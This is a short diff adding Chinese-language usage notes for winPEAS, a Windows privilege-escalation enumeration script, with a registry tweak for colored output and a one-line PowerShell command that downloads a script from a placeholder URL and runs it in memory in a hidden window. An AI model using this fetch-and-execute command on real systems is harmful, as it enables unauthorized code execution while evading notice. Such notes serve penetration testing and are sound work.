@@ -1,0 +1,5 @@
+项目地址:https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS/winPEASps1
+>改注册表使得winpeas能够格式化输出
+REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1
+>内存执行
+powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('$downloadurl')"
